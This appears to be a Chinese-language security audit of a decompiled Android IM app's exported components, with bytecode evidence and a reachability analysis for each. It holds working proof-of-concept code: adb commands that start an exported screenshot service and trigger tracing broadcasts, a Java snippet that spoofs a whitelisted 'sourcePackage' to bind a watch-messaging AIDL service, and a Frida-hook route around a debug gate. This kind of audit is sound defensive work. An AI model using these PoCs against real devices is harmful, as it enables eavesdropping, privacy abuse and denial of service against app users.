# 10 · 攻击面 PoC（IM 8.2.2.1 专属版 `<PKG>`）

> 口径：**[观察]** = 代码/清单/字节码直接可见；**[推断]** = 由可见证据推出的结论；**[未知]** = 需要真机实测才能定的。
> 所有 `java/sources/...` 行号对应 `re/base_apk3/java/sources`（jadx 1.5.6 全量反编译，84,971 个 .java）。
> 清单证据统一取 `scan/dex-index/manifest-xmltree.txt`（aapt2 dump xmltree）。

---

## 0. 结论速览

| # | 目标 | 暴露面 | 第三方 App 实际能做什么 | 定性 |
|---|------|--------|--------------------------|------|
| 1 | `/action/mock_nologin_switch`（BokuiActivity 路由） | 无权限深链 | 路由可达、能走到 sink，但 sink 被 `Doraemon.getRunningMode()==4` 挡死 → **release 无效果** | [观察] 可达 / [推断] 不可利用 |
| 2 | `ScreenRecorderService` | exported 无权限 | 复用**已有** MediaProjection 令牌截屏（无令牌时只报错），截图落到私有目录并走IM上传通道 | [观察] 能力 / [推断] 依赖前置授权 |
| 3 | `RequestDispatchService` | exported 无权限 | 包名+签名白名单校验，**但校验的是调用方自报的 `sourcePackage`**，不是 `Binder.getCallingUid()` → 身份可伪造成已安装白名单包 | [观察] 绕过点 / [推断] 需白名单包在位 |
| 4 | `ExternalProvider` | exported + **normal 级自定义权限** | 任何 App 声明 `<uses-permission>` 即自动授予 → 读到两个布尔开关 | [观察] 可直接读 |
| 5 | `TracingBroadcastReceiver`(×2) | exported 无权限 | 任意 App 触发方法级 trace 采样 / 停止，产物写外部私有目录 | [观察] 触发面；[未知] 非 debuggable 是否真正采样 |

---

## 1. `mock_nologin_switch`：dex 级字符串 xref

### 1.1 工具与结果（不复用 grep java）

`tools/poc/dex_xref.py`：先对 30 个 dex 做**字符串表预扫**（自写 DEX 头/string_ids 解析，不加载 androguard），命中后再用 androguard 逐方法解码指令，定位 `const-string` / `const-string/jumbo` 站点并回填 pc 偏移。

```
python tools/poc/dex_xref.py unpacked/dex mock_nologin_switch
[prescan] dex containing 'mock_nologin_switch': ['classes4.dex']
[scan] classes4.dex hits=1
HIT  classes4.dex  Lcom/alibaba/android/<pkg>/utils/UrlUtils;  G(Landroid/app/Activity;Landroid/net/Uri;Landroid/content/Intent;)Z  pc=0x14c0  "/action/mock_nologin_switch"
```

**[观察]** 全 30 dex、180,864 类里，字面量 `/action/mock_nologin_switch` 只有 **1 处** `const-string`，位于 `classes4.dex` 的 `UrlUtils.G`（该方法 16,554 指令单元，jadx 放弃反编译：`UrlUtils.java:2658` 处只有 `throw new UnsupportedOperationException("Method not decompiled...")`，所以只能看字节码）。

### 1.2 字节码窗口（`tools/poc/disasm_method.py ... G 14c0`）

```
0014b8  invoke-virtual {v37}, Landroid/net/Uri;->getPath()Ljava/lang/String;
0014be  move-result-object v0
0014c0  const-string v10, "/action/mock_nologin_switch"      <== HIT
0014c4  invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
0014ca  move-result v0
0014cc  if-eqz v0, +017h                                  ; 不等 → 0x14fa（下一个 path 分支）
0014d0  const-string v0, "key"
0014d4  invoke-static {v37, v0}, UrlUtils->p(Uri,String)    ; key = getQueryParameter("key")
0014da  move-result-object v0
0014dc  const-string v2, "value"
0014e0  invoke-static {v37, v2}, UrlUtils->p(Uri,String)    ; value = getQueryParameter("value")
0014e6  move-result-object v1
0014e8  sget-object v2, Lcom/alibaba/android/imclient/userbase/ContactInterface;->v1()
0014f0  invoke-virtual {v2, v0, v1}, ContactInterface->X4(String,String)V
```

**[观察]** sink 就是 `ContactInterface.X4(key, value)`：无登录判断、无签名校验、无开关门控。

### 1.3 sink 链路

1. `com/alibaba/android/user/impl/ContactInterfaceImpl.java:7363` `X4(String,String)`：
   ```java
   if (TextUtils.isEmpty(str) || TextUtils.isEmpty(str2) || Doraemon.getRunningMode() == 4) return;
   NoLoginSwitchService.j().r(str, "true".equals(str2));
   lf0.m1("Mock NoLogin Switch key: " + str + " value: " + str2);
   ```
2. `com/alibaba/android/user/service/NoLoginSwitchService.java:338` `r(key,val)` → `u8j.Q("mock_no_login_key_prefix_"+key, val)`（SharedPreferences 落盘）。
   读取侧：`o()` = `u8j.a(...)`（键存在判定，:291）；`k()` = `u8j.c(...)`（:233）；`l(key,default)` 优先返回 mock 值（:242）。
3. 语义：mock 掉 `no_login` 系列开关（`no_login_cache_key_*`），即「未登录也当成已登录可用的功能位」。

### 1.4 release 可达性判定

**入口可达 [观察]**
- 清单里 `BokuiActivity` 的单条 intent-filter 同时声明 `scheme=imclient/http/https`、`host=imclientclient/qr.<host>` 与近百条 `path`（含 `/action/mock_nologin_switch`，`manifest-xmltree.txt:1102`）；Android 会把同一 filter 内多个 `<data>` 的属性合并，故 `imclient://imclientclient/action/mock_nologin_switch?...` 命中。
- `BokuiActivity.onCreate`（`BokuiActivity.java:929`）→ `o(intent,true)`（:789）→ ACTION_VIEW 分支 → `m(intent)`（:729）→ `UrlUtils.Q`（`UrlUtils.java:2825`）。
- `Q` 取该 Activity 命中的 filter categories（`k()`，:3244），含 `<PKG>` → `O(activity,uri,intent)`（:2750）→ `if (!G(...))` → **`G` 被调用**（`G` 位于 :2658）。
- 该路径没有登录判定：登录拦截只在旁支 `UrlUtils.J()`（:2683，`isLogin() || !R()`）等处；本路径也未被 `h(intent)`（分享）/`k(intent,data)`（OPPO relay）提前 return（`BokuiActivity.o()` :789）。

**sink 无效 [观察]**
- `Doraemon.sMode` 默认 **4**（`com/alibaba/doraemon/Doraemon.java:32` `private static int sMode = 4;`），`setDebugMode(true)` 才置 1（:242-250）。全包检索 `setDebugMode(true)` 只命中两个三方库（`com/youku/upsplayer/util/Logger.java:15`、kotlin descriptor renderer），**业务侧无调用**。
- `setRunningMode(2)` 只出现在 `AIBallPublisherHelper.java:195` 与 `defpackage/f6.java:489`，且都是 `if (getRunningMode()==1)` 才提升 → release 恒为 4。
- 因此 `X4` 首行即 return：**写入 mock 开关在 release 不发生**（连 toast 都不打）。

**[推断]** 该深链是「测试期 mock 开关」的残留：路由与 sink 都在，只差 running mode。一旦 mode≠4（改包重签 + 改 `setDebugMode`、或 Frida hook `Doraemon.getRunningMode` 返回 2），`key/value` 即可写成任意 `mock_no_login_key_prefix_*`，把服务端下发的 `no_login` 结果本地改写。

**PoC（仅验证可达性，release 无副作用）**
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "imclient://imclientclient/action/mock_nologin_switch?key=demo_probe&value=true" \
  -n <PKG>/<PKG>
# 观察 logcat：BokuiActivity handleIntent，uri=...mock_nologin_switch...
# 判据：release 下无 "Mock NoLogin Switch key:" toast；Frida 改 mode 后可看到该 toast 与 SP 落盘
```

---

## 2. 两个 exported 且无权限校验的 Service

### 2.1 `ScreenRecorderService`（`com.alibaba.lightapp.runtime.service.ScreenRecorderService`）

清单：`manifest-xmltree.txt:15906` → `exported=true`，**无 permission**，`foregroundServiceType=0x20`（mediaProjection）。

**[观察] 代码事实**
- `onCreate`（:345）：拿 `MediaProjectionManager`，起 `HandlerThread("ScreenshotHandlerThread")`。
- `onStartCommand`（:375）：`startForeground(1, c(), 32)`；`action=="START"` → `j()`；`extra "url"` → `this.m = url`。
- `j()`（:320）：`if (o == null) { toast("截屏失败(0)"); } else b();`
- `b()`（:224）：`c.post(() -> f())` → 工作线程执行 `f()`。
- `f()`（:78）：`MediaProjectionManager.getMediaProjection(this.f29873a, -1, o)` → `ImageReader.newInstance(w,h,1,2)` + `VirtualDisplay` → 取 `Image` → `Bitmap` → `h(ctx,bitmap)`。
- `h()`（:290）：PNG 存 `getFilesDir()/aiStick/yyyy_MM_dd_<6位秒>.png`（**应用私有目录**，模式默认 0600）。
- 截图成功后 `AIBallReqManager.A(this.m, file.getPath())`（:150 附近）→ `AIBallReqManager.D()`（`runtime/nav/AIBallReqManager.java:388`）→ `csq.a().doUploadFile(path, cb)`；回调 `onSuccess` → `AIBallReqManager.u(this.b /*=url*/, items)`（:644）→ 给 URL 追加 `dd_input_token` 后打开页面。
- `static Intent o` 由 `i(Intent)`（:215）写入，唯一外部写入点是 `TransparentForRequestActivity.onActivityResult`（`runtime/activity/TransparentForRequestActivity.java:142`）—— 即**应用内** `MediaProjection` 授权结果。

**[推断] 第三方能力边界**
- 冷启动/无前置授权时 `o==null` → `START` 只得到“截屏失败(0)”，**不能**凭空录屏；系统侧也不会把 MediaProjection 令牌发给别的 App。
- 若用户此前在IM内授权过「AI 助手截屏」且**进程还活着**，任意 App `startService(action=START)` 可让IM**再截一次当前屏幕**，图片进私有目录并被上传到IM的 AI 助手链路（不是攻击者服务器，`url` 只影响随后打开的 H5 地址）。
- 危害按「隐私再采集 + 资源消耗 + 令牌复用」计；不是任意截屏外泄。

**PoC（adb）**
```bash
PKG=<PKG>
adb shell am start-foreground-service -n $PKG/com.alibaba.lightapp.runtime.service.ScreenRecorderService \
  -a START --es url "https://example.invalid/probe"
# 判据：
#  - 无授权：logcat/toast "截屏失败(0)"
#  - 有授权：files/aiStick/ 下新增 PNG（adb shell run-as 不可用于 release，需 root 或直接看上传行为）
adb shell dumpsys activity services $PKG | grep -A3 ScreenRecorder
```

**PoC（App 内，等价）**
```java
Intent i = new Intent("START").setClassName("<PKG>",
        "com.alibaba.lightapp.runtime.service.ScreenRecorderService");
i.putExtra("url", "https://example.invalid/probe");
if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
```

### 2.2 `RequestDispatchService`（`com.alibaba.imclient.imclientwatchsdk.msghandler.RequestDispatchService`）

清单：`manifest-xmltree.txt:22032` → `exported=true`，**无 permission**，带自身类名 action（便于隐式启动）。

**[观察] 代码事实**（`java/sources/com/alibaba/imclient/imclientwatchsdk/msghandler/RequestDispatchService.java`）
- `onBind`（:235）：取 `intent.getStringExtra("sourcePackage")` → `new l6n(this, sourcePackage).b()`，通过才返回 AIDL `RequestRemoteService.a`（`this.c`），否则 `null`。
- `l6n`（`defpackage/l6n.java`）：`c()` 用 `PackageManager.getPackageInfo(pkg, 64)` 取签名 → SHA1；`d()` 写死白名单：
  - `com.alibaba.imclient.watchtestdemo` → `64:87:D2:A7:E5:01:01:4C:D7:3A:EA:D6:47:1A:4E:16:36:3A:2D:16`
  - `com.mobvoi.dd` → `CE:A8:2E:08:79:4C:F9:BA:D5:F1:CD:96:24:F6:CC:67:00:01:E2:B5`
  `b()` 比对「包名 == 传入包名 && 该包签名 == 表内签名」。
- AIDL 面：`register(module, cb)`（:61）/ `unregister` / `sendNotiyMsg(id,Bundle)`（:84）/ `sendResponse(id,Bundle)`；回调经 `RemoteCallbackList` 广播 `onRequestReceived`（:198）。
- 内部 `HandlerThread("RequestDispatcherService Message Handler Thread")`（:126），`what=0..3` → `j()/k()/i()`；`k()/i()` 经 `zy7.g(handler)` 把 JSON 送回手表链路（:161/:212）。

**[观察] 关键缺陷**：整个类**没有** `Binder.getCallingUid()` / `checkCallingPermission`（`grep -c getCallingUid = 0`）。身份判断只依赖**调用方自己塞进 Intent 的 `sourcePackage`**，再用 PackageManager 去查**那个包名**的签名。

**[推断] 后果**
- 设备上装了 `com.mobvoi.dd`（TicWatch IM）或测试包时，任意 App 把 `sourcePackage` 填成它 → `l6n.b()` 通过 → 拿到完整 AIDL stub，可注册 module 回调窃听手表链路的 `onRequestReceived`，也可伪造 `sendResponse/sendNotiyMsg`。
- 两个白名单包都不在设备上时，`bind` 返回 `null`，只能得到一个空绑定（无能力）。

**PoC（Java，核心 12 行）**
```java
Intent i = new Intent().setClassName("<PKG>",
        "com.alibaba.imclient.imclientwatchsdk.msghandler.RequestDispatchService");
i.putExtra("sourcePackage", "com.mobvoi.dd");     // 关键：自报白名单包名
bindService(i, new ServiceConnection() {
    public void onServiceConnected(ComponentName n, IBinder b) {
        RequestRemoteService s = RequestRemoteService.a.a(b);   // AIDL stub
        s.register("demo", cb);                                  // 收 onRequestReceived
    }
    public void onServiceDisconnected(ComponentName n) {}
}, BIND_AUTO_CREATE);
```
（AIDL 描述符取自 `com.alibaba.imclient.dtwatchsdk.RequestRemoteService`，`tools/poc/` 内附 `.aidl` 说明。）

**PoC（adb，仅证明可达/无副作用）**
```bash
adb shell am startservice -n <PKG>/com.alibaba.imclient.imclientwatchsdk.msghandler.RequestDispatchService
adb shell dumpsys activity services <PKG> | grep -i RequestDispatch
```

---

## 3. `ExternalProvider`：读取协议 + 20 行 PoC

### 3.1 清单事实

`manifest-xmltree.txt:2429-2435`

| 属性 | 值 |
|---|---|
| name | `<PKG>` |
| authorities | `<PKG>` |
| exported | `true` |
| readPermission | `<PKG>` |
| writePermission | `...permission.external.provider.WRITE` |
| grantUriPermissions | `false` |

同清单 `:110`：`READ` 的 `protectionLevel=0x00000000` → **normal**；`:113` `WRITE` 为 `0x00000002` → signature。
**[观察]** normal 级自定义权限 = 任何 App 在自身清单写一行 `<uses-permission>`，安装时即被系统自动授予，无需用户点同意、无需与IM同签名。

### 3.2 读取协议（代码事实）

`java/sources/com/alibaba/android/<pkg>/provider/ExternalProvider.java`

```java
public Cursor query(Uri uri, String[] proj, String sel, String[] args, String sort) {   // :125
    if (!eb9.a().b("f_base_external_provider_enabled")   // 灰度开关
        || !mj7.g().c().isLogin()                        // 必须已登录
        || !String.valueOf(uri.getPath()).equals("/oa")) // 路径必须 /oa
        return null;
    boolean hasAttend     = a(158L);   // OA 微应用 appId 158 是否存在
    boolean hasAttendance = a(-8L);    // appId -8
    MatrixCursor c = new MatrixCursor(new String[]{"hasAttend","hasAttendance"});
    c.addRow(new Object[]{hasAttend?1:0, hasAttendance?1:0});
    return c;
}
```
- 列定义：`f19497a = {"hasAttend","hasAttendance"}`（:29）。
- `a(long appId)`（:31）：遍历 `OAInterface.Q().x()`（组织微应用列表）比对 `microAPPObject.appId`。
- `insert`（:105）/`update`（:141）/`delete`（:85）全部空实现，`getType`（:95）返回 null；`onCreate`（:114）只做一次 `LifecycleUtils.setLifecycleCallbacks` 反射注入。
- URI 形态：`content://<PKG>/oa`

**[观察] 可读字段全集**：`hasAttend`、`hasAttendance` 两个 0/1 整数（不是布尔列，`MatrixCursor` 用 `Integer`）。除此之外没有别的列、没有参数化的 appId 查询、没有写入面。

### 3.3 最小读取 PoC（20 行）

```java
// tools/poc/ExternalProviderPoc.java — 需在自带清单声明 READ 权限的 APK 内运行
Uri u = Uri.parse("content://<PKG>/oa");
try (Cursor c = getContentResolver().query(u, null, null, null, null)) {
    if (c == null) { Log.w("POC", "null cursor: 未登录/灰度关闭/无权限"); return; }
    Log.i("POC", "cols=" + Arrays.toString(c.getColumnNames()));
    while (c.moveToNext())
        Log.i("POC", "hasAttend=" + c.getInt(0) + " hasAttendance=" + c.getInt(1));
}
```
清单一行：
```xml
<uses-permission android:name="<PKG>"/>
```
（adb 直接 `content query` **不行**：shell uid 没有该 normal 权限，会 `SecurityException`；必须走声明权限的 APK。）

**[未知]** `f_base_external_provider_enabled` 的默认值（`eb9.a().b(...)` 走远程配置）；若默认 false 则只在灰度组织上可读。判断方法：PoC 返回 null 即为关闭。

---

## 4. `TracingBroadcastReceiver`：action / extra / 产物

### 4.1 清单与代码

`manifest-xmltree.txt:19279-19294`：两个 receiver 均 `exported=true`、无 permission：

| 类 | 进程 | actions |
|---|---|---|
| `owt.conference.debugger.TracingBroadcastReceiver` | 默认（主进程） | `imclient.mcs.start_tracing` / `imclient.mcs.stop_tracing` |
| `owt.conference.debugger.TracingBroadcastReceiverMcsProcess` | `:mcs` | 同上 |

`java/sources/owt/conference/debugger/TracingBroadcastReceiver.java`（全文 25 行）：
```java
public String a() { return "mcs_trace"; }                       // :12  MCS 变体覆写为 "mcs_trace_mcs_process"
public void onReceive(Context ctx, Intent intent) {              // :17
    if ("imclient.mcs.start_tracing".equals(intent.getAction()))
        Debug.startMethodTracing(new File(ctx.getExternalFilesDir("mcs"), a()).getAbsolutePath());
    else if ("imclient.mcs.stop_tracing".equals(intent.getAction()))
        Debug.stopMethodTracing();
}
```
- **无 extra**：完全靠 action 二选一，没有任何参数校验。
- 产物路径（`getExternalFilesDir("mcs")`）：
  - 主进程 → `/sdcard/Android/data/<PKG>/files/mcs/mcs_trace.trace`
  - `:mcs` 进程 → `.../files/mcs/mcs_trace_mcs_process.trace`
- 文件属主 `u0_aXXX:sdcard_rw`，模式 0600（应用专属外部目录，其他 App 不可读；`adb pull` 需 root 或 `adb shell` 有 sdcard 访问权）。

**[观察] 影响**：任意 App 一条广播即可让IM进入方法级采样（全线程插桩，开销极大、文件可达数百 MB），再一条停止；可反复触发 → 卡顿/掉帧/写盘放大（DoS 面）。`Debug.stopMethodTracing()` 在未采样时抛异常，会在 receiver 里形成一次未捕获异常（可忽略）。

**[未知]** 非 debuggable 的 release 包上 `Debug.startMethodTracing` 是否真的开始采样（ART 侧对 tracing 有额外判定）。判据：触发后 `ls -l` 看文件是否出现/增长，及 logcat `TracingBroadcastReceiver receive action: ...`。

### 4.2 adb 触发与产物提取

```bash
PKG=<PKG>
# 主进程
adb shell am broadcast -a imclient.mcs.start_tracing \
  -n $PKG/owt.conference.debugger.TracingBroadcastReceiver
sleep 5
adb shell am broadcast -a imclient.mcs.stop_tracing \
  -n $PKG/owt.conference.debugger.TracingBroadcastReceiver
# :mcs 进程（注意组件在 :mcs 里跑）
adb shell am broadcast -a imclient.mcs.start_tracing \
  -n $PKG/owt.conference.debugger.TracingBroadcastReceiverMcsProcess
adb shell am broadcast -a imclient.mcs.stop_tracing \
  -n $PKG/owt.conference.debugger.TracingBroadcastReceiverMcsProcess

# 产物
adb shell ls -l /sdcard/Android/data/$PKG/files/mcs/
adb pull /sdcard/Android/data/$PKG/files/mcs/mcs_trace.trace .
# 解析（需 Android SDK trace 工具）
#   java -cp $ANDROID_HOME/platform-tools/lib/ddmlib.jar com.android.ddmlib.Log  ...
#   或 dmtracedump -o mcs_trace.trace > mcs_trace.txt
```

---

## 5. 未解项 / 需实测

1. `Doraemon.sMode` 在**专属版真实设备**上是否被 manifest meta-data / 服务端配置改成 1/2（本报告只证明默认值与代码路径）。
2. `RequestDispatchService` 白名单包在目标机上是否存在（不存在则伪造成本上升到「自签同名包」，但签名比对仍然拦得住）。
3. `f_base_external_provider_enabled` 默认值与作用域（灰度是否默认开）。
4. release 包 `Debug.startMethodTracing` 是否生效（ART 判定）。
5. `ScreenRecorderService` 的 `o` 令牌存活窗口（进程被杀即失效）。

## 6. 产物清单（`tools/poc/`）

| 文件 | 用途 |
|---|---|
| `dex_xref.py` | 30 dex 字符串表预扫 + `const-string` 指令级 xref（含 pc 偏移），本报告 §1 的取证工具 |
| `disasm_method.py` | 单方法字节码打印（jadx 放弃反编译时使用），支持窗口定位 |
| `ExternalProviderPoc.java` | §3 的 20 行读取 PoC（含清单片段注释） |
| `RequestDispatchServicePoc.java` | §2.2 的 bind + `sourcePackage` 伪造 PoC |
| `poc.sh` | §1/§2.1/§4 的 adb 复现脚本合集 |
